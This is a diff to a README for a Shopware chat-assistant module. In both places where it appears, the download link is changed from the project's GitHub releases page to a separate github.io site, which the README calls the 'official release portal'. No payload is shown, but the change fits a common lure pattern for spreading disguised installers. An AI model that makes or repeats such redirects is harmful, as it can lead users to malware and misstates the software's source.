@@ -1,6 +1,6 @@
 # 🤖 shopware - Improve customer support with smart chat
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Kenzk5943/shopware/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://kenzk5943.github.io)
 
 This application provides the Emporiqa Chat Assistant module for Shopware. It helps store owners automate customer support and provide product recommendations through an AI-powered interface. You can integrate this assistant directly into your existing e-commerce storefront to answer questions and guide visitors during their shopping experience.
 
@@ -8,7 +8,7 @@ This application provides the Emporiqa Chat Assistant module for Shopware. It he
 
 To get the software, visit the official release portal.
 
-[Download the latest version here](https://github.com/Kenzk5943/shopware/releases)
+[Download the latest version here](https://kenzk5943.github.io)
 
 Follow these steps to obtain the installer:
 
